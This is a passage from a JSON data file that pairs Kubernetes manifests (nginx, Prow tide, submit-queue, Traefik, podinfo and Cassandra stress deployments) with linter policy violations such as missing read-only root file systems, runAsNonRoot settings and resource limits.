    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cassandra-stress-small\n  labels:\n    app: cassandra-stress\nspec:\n  volumes:\n  - name: cassandra-stress-profile-volume\n    configMap:\n      name: cassandra-stress-small\n  securityContext:\n    fsGroup: 1\n    runAsNonRoot: true\n    runAsUser: 1006\n    supplementalGroups:\n    - 1\n  containers:\n  - name: cassie1-cassandra-stress\n    image: orangeopensource/cassandra-image\n    imagePullPolicy: IfNotPresent\n    securityContext:\n      capabilities:\n        add:\n        - IPC_LOCK\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - cassandra-stress 'user profile=/opt/cassandra-stress/small_stress.yaml ops(insert=2,query_by_sub_id=1)\n      duration=1m cl=one -node cassandra-demo -mode native cql3 user=cassandra password=cassandra\n      -rate threads=20 -pop seq=0..1M -graph file=/tmp/stress-small.html' && echo\n      END && while true ; do sleep 60; done\n    resources:\n      limits:\n        cpu: 1\n        memory: 2Gi\n      requests:\n        cpu: 1\n        memory: 2Gi\n    volumeMounts:\n    - name: cassandra-stress-profile-volume\n      mountPath: /opt/cassandra-stress\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cassie1-cassandra-stress\" does not have a read-only root file system"
  },
  {
    "id": "7195",
    "manifest_path": "data/manifests/the_stack_sample/sample_2631.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: '{{name}}'\n  labels:\n    app: '{{name}}'\nspec:\n  ports:\n  - port: 8080\n    name: service\n    targetPort: 8080\n    protocol: TCP\n  selector:\n    app: '{{name}}'\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "service has invalid label selector: values[0][app]: Invalid value: \"{{name}}\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
  },
  {
    "id": "7196",
    "manifest_path": "data/manifests/the_stack_sample/sample_2633.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx\n        name: nginx\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7197",
    "manifest_path": "data/manifests/the_stack_sample/sample_2633.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx\n        name: nginx\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7198",
    "manifest_path": "data/manifests/the_stack_sample/sample_2633.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx\n        name: nginx\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7199",
    "manifest_path": "data/manifests/the_stack_sample/sample_2633.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx\n        name: nginx\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7200",
    "manifest_path": "data/manifests/the_stack_sample/sample_2633.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx\n        name: nginx\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7201",
    "manifest_path": "data/manifests/the_stack_sample/sample_2634.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210429-37bf34fe13\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tide\" does not have a read-only root file system"
  },
  {
    "id": "7202",
    "manifest_path": "data/manifests/the_stack_sample/sample_2634.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210429-37bf34fe13\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"tide\" not found"
  },
  {
    "id": "7203",
    "manifest_path": "data/manifests/the_stack_sample/sample_2634.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210429-37bf34fe13\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tide\" is not set to runAsNonRoot"
  },
  {
    "id": "7204",
    "manifest_path": "data/manifests/the_stack_sample/sample_2634.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210429-37bf34fe13\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tide\" has cpu request 0"
  },
  {
    "id": "7205",
    "manifest_path": "data/manifests/the_stack_sample/sample_2634.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210429-37bf34fe13\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tide\" has memory limit 0"
  },
  {
    "id": "7206",
    "manifest_path": "data/manifests/the_stack_sample/sample_2636.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: submit-queue\n  namespace: default\n  labels:\n    app: submit-queue\n    version: '0.12'\nspec:\n  containers:\n  - image: gcr.io/google_containers/submit-queue:0.12\n    command:\n    - ./submit-queue\n    - --jenkins-host=http://jenkins-master:8080\n    - --token-file=/etc/secret-volume/token\n    - --jenkins-jobs=kubernetes-e2e-gce,kubernetes-e2e-gke-ci,kubernetes-build,kubernetes-e2e-gce-parallel,kubernetes-e2e-gce-reboot,kubernetes-e2e-gce-scalability\n    - --alsologtostderr\n    - --v=5\n    - --www=/www\n    imagePullPolicy: IfNotPresent\n    name: submit-queue\n    volumeMounts:\n    - name: secret-volume\n      mountPath: /etc/secret-volume\n    ports:\n    - name: status\n      containerPort: 8080\n    livenessProbe:\n      httpGet:\n        path: /api\n        port: 8080\n      initialDelaySeconds: 10\n      timeoutSeconds: 1\n  volumes:\n  - name: secret-volume\n    secret:\n      secretName: github-token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"submit-queue\" does not have a read-only root file system"
  },
  {
    "id": "7207",
    "manifest_path": "data/manifests/the_stack_sample/sample_2636.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: submit-queue\n  namespace: default\n  labels:\n    app: submit-queue\n    version: '0.12'\nspec:\n  containers:\n  - image: gcr.io/google_containers/submit-queue:0.12\n    command:\n    - ./submit-queue\n    - --jenkins-host=http://jenkins-master:8080\n    - --token-file=/etc/secret-volume/token\n    - --jenkins-jobs=kubernetes-e2e-gce,kubernetes-e2e-gke-ci,kubernetes-build,kubernetes-e2e-gce-parallel,kubernetes-e2e-gce-reboot,kubernetes-e2e-gce-scalability\n    - --alsologtostderr\n    - --v=5\n    - --www=/www\n    imagePullPolicy: IfNotPresent\n    name: submit-queue\n    volumeMounts:\n    - name: secret-volume\n      mountPath: /etc/secret-volume\n    ports:\n    - name: status\n      containerPort: 8080\n    livenessProbe:\n      httpGet:\n        path: /api\n        port: 8080\n      initialDelaySeconds: 10\n      timeoutSeconds: 1\n  volumes:\n  - name: secret-volume\n    secret:\n      secretName: github-token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"submit-queue\" is not set to runAsNonRoot"
  },
  {
    "id": "7208",
    "manifest_path": "data/manifests/the_stack_sample/sample_2636.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: submit-queue\n  namespace: default\n  labels:\n    app: submit-queue\n    version: '0.12'\nspec:\n  containers:\n  - image: gcr.io/google_containers/submit-queue:0.12\n    command:\n    - ./submit-queue\n    - --jenkins-host=http://jenkins-master:8080\n    - --token-file=/etc/secret-volume/token\n    - --jenkins-jobs=kubernetes-e2e-gce,kubernetes-e2e-gke-ci,kubernetes-build,kubernetes-e2e-gce-parallel,kubernetes-e2e-gce-reboot,kubernetes-e2e-gce-scalability\n    - --alsologtostderr\n    - --v=5\n    - --www=/www\n    imagePullPolicy: IfNotPresent\n    name: submit-queue\n    volumeMounts:\n    - name: secret-volume\n      mountPath: /etc/secret-volume\n    ports:\n    - name: status\n      containerPort: 8080\n    livenessProbe:\n      httpGet:\n        path: /api\n        port: 8080\n      initialDelaySeconds: 10\n      timeoutSeconds: 1\n  volumes:\n  - name: secret-volume\n    secret:\n      secretName: github-token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"submit-queue\" has cpu request 0"
  },
  {
    "id": "7209",
    "manifest_path": "data/manifests/the_stack_sample/sample_2636.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: submit-queue\n  namespace: default\n  labels:\n    app: submit-queue\n    version: '0.12'\nspec:\n  containers:\n  - image: gcr.io/google_containers/submit-queue:0.12\n    command:\n    - ./submit-queue\n    - --jenkins-host=http://jenkins-master:8080\n    - --token-file=/etc/secret-volume/token\n    - --jenkins-jobs=kubernetes-e2e-gce,kubernetes-e2e-gke-ci,kubernetes-build,kubernetes-e2e-gce-parallel,kubernetes-e2e-gce-reboot,kubernetes-e2e-gce-scalability\n    - --alsologtostderr\n    - --v=5\n    - --www=/www\n    imagePullPolicy: IfNotPresent\n    name: submit-queue\n    volumeMounts:\n    - name: secret-volume\n      mountPath: /etc/secret-volume\n    ports:\n    - name: status\n      containerPort: 8080\n    livenessProbe:\n      httpGet:\n        path: /api\n        port: 8080\n      initialDelaySeconds: 10\n      timeoutSeconds: 1\n  volumes:\n  - name: secret-volume\n    secret:\n      secretName: github-token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"submit-queue\" has memory limit 0"
  },
  {
    "id": "7210",
    "manifest_path": "data/manifests/the_stack_sample/sample_2638.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: basket-api\n  labels:\n    app: eshop\n    service: basket\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n    name: http\n  - port: 81\n    protocol: TCP\n    name: grpc\n  selector:\n    service: basket\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[service:basket])"
  },
  {
    "id": "7211",
    "manifest_path": "data/manifests/the_stack_sample/sample_2640.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: folder-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n          - name: NAMESPACE\n            value: default\n          - name: CLUSTER_RESOURCE\n            value: dogfooding-tekton-cd\n          - name: FOLDER_PATH\n            value: tekton/cronjobs/robocat\n          - name: FOLDER_DESCRIPTION\n            value: tekton-cronjobs-robocat\n          - name: FOLDER_OVERLAY\n            value: 'true'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"trigger\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7212",
    "manifest_path": "data/manifests/the_stack_sample/sample_2640.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: folder-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n          - name: NAMESPACE\n            value: default\n          - name: CLUSTER_RESOURCE\n            value: dogfooding-tekton-cd\n          - name: FOLDER_PATH\n            value: tekton/cronjobs/robocat\n          - name: FOLDER_DESCRIPTION\n            value: tekton-cronjobs-robocat\n          - name: FOLDER_OVERLAY\n            value: 'true'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"trigger\" does not have a read-only root file system"
  },
  {
    "id": "7213",
    "manifest_path": "data/manifests/the_stack_sample/sample_2640.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: folder-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n          - name: NAMESPACE\n            value: default\n          - name: CLUSTER_RESOURCE\n            value: dogfooding-tekton-cd\n          - name: FOLDER_PATH\n            value: tekton/cronjobs/robocat\n          - name: FOLDER_DESCRIPTION\n            value: tekton-cronjobs-robocat\n          - name: FOLDER_OVERLAY\n            value: 'true'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"trigger\" is not set to runAsNonRoot"
  },
  {
    "id": "7214",
    "manifest_path": "data/manifests/the_stack_sample/sample_2640.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: folder-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n          - name: NAMESPACE\n            value: default\n          - name: CLUSTER_RESOURCE\n            value: dogfooding-tekton-cd\n          - name: FOLDER_PATH\n            value: tekton/cronjobs/robocat\n          - name: FOLDER_DESCRIPTION\n            value: tekton-cronjobs-robocat\n          - name: FOLDER_OVERLAY\n            value: 'true'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"trigger\" has cpu request 0"
  },
  {
    "id": "7215",
    "manifest_path": "data/manifests/the_stack_sample/sample_2640.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: folder-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n          - name: NAMESPACE\n            value: default\n          - name: CLUSTER_RESOURCE\n            value: dogfooding-tekton-cd\n          - name: FOLDER_PATH\n            value: tekton/cronjobs/robocat\n          - name: FOLDER_DESCRIPTION\n            value: tekton-cronjobs-robocat\n          - name: FOLDER_OVERLAY\n            value: 'true'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"trigger\" has memory limit 0"
  },
  {
    "id": "7216",
    "manifest_path": "data/manifests/the_stack_sample/sample_2641.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8761\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7217",
    "manifest_path": "data/manifests/the_stack_sample/sample_2641.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8761\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7218",
    "manifest_path": "data/manifests/the_stack_sample/sample_2641.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8761\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7219",
    "manifest_path": "data/manifests/the_stack_sample/sample_2641.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8761\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7220",
    "manifest_path": "data/manifests/the_stack_sample/sample_2641.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-8761\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7221",
    "manifest_path": "data/manifests/the_stack_sample/sample_2642.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: traefik-ingress-controller\n  labels:\n    k8s-app: traefik-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: traefik-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: traefik-ingress-lb\n        name: traefik-ingress-lb\n    spec:\n      containers:\n      - image: easypi/traefik-arm\n        name: traefik-ingress-lb\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 8080\n        args:\n        - --web\n        - --kubernetes\n        - --logLevel=DEBUG\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"traefik-ingress-lb\" is using an invalid container image, \"easypi/traefik-arm\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7222",
    "manifest_path": "data/manifests/the_stack_sample/sample_2642.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: traefik-ingress-controller\n  labels:\n    k8s-app: traefik-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: traefik-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: traefik-ingress-lb\n        name: traefik-ingress-lb\n    spec:\n      containers:\n      - image: easypi/traefik-arm\n        name: traefik-ingress-lb\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 8080\n        args:\n        - --web\n        - --kubernetes\n        - --logLevel=DEBUG\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"traefik-ingress-lb\" does not have a read-only root file system"
  },
  {
    "id": "7223",
    "manifest_path": "data/manifests/the_stack_sample/sample_2642.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: traefik-ingress-controller\n  labels:\n    k8s-app: traefik-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: traefik-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: traefik-ingress-lb\n        name: traefik-ingress-lb\n    spec:\n      containers:\n      - image: easypi/traefik-arm\n        name: traefik-ingress-lb\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 8080\n        args:\n        - --web\n        - --kubernetes\n        - --logLevel=DEBUG\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"traefik-ingress-lb\" is not set to runAsNonRoot"
  },
  {
    "id": "7224",
    "manifest_path": "data/manifests/the_stack_sample/sample_2642.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: traefik-ingress-controller\n  labels:\n    k8s-app: traefik-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: traefik-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: traefik-ingress-lb\n        name: traefik-ingress-lb\n    spec:\n      containers:\n      - image: easypi/traefik-arm\n        name: traefik-ingress-lb\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 8080\n        args:\n        - --web\n        - --kubernetes\n        - --logLevel=DEBUG\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"traefik-ingress-lb\" has cpu request 0"
  },
  {
    "id": "7225",
    "manifest_path": "data/manifests/the_stack_sample/sample_2642.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: traefik-ingress-controller\n  labels:\n    k8s-app: traefik-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: traefik-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: traefik-ingress-lb\n        name: traefik-ingress-lb\n    spec:\n      containers:\n      - image: easypi/traefik-arm\n        name: traefik-ingress-lb\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 8080\n        args:\n        - --web\n        - --kubernetes\n        - --logLevel=DEBUG\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"traefik-ingress-lb\" has memory limit 0"
  },
  {
    "id": "7226",
    "manifest_path": "data/manifests/the_stack_sample/sample_2644.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux Emidio'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "7227",
    "manifest_path": "data/manifests/the_stack_sample/sample_2644.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to 